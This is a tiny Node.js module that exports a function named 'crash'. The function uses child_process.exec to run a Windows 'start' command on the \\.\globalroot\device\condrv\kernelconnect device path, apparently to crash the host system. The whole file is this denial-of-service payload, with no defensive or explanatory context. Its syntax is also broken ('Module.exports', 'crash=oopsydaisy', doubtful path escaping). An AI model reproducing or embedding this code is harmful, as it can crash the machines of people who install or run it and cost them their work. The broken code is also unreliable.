const { exec } = require('child_process')

function oopsydaisy() {
    exec('start "" \\.\globalroot\device\condrv\kernelconnect');
}

Module.exports = {
    crash=oopsydaisy
}